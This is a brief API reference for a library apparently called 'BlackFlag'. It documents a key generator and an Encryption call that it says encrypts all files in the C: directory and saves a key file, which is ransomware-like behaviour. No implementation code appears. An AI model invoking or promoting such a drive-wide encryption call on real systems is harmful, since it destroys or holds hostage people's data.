## API Reference

#### keyGenerator

```http
  KEY = BlackFlag.keyGenerator()
```

| Type     | Description                |
| :------- | :------------------------- |
| `Byte` | **Required**. Your Encryption Key |

#### Encryption

```http
  BlackFlag.Encryption(KEY)
```

| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `KEY`      | `data: bytes` | **Required**. Encrypts all files in the C: directory and creates a file for key|
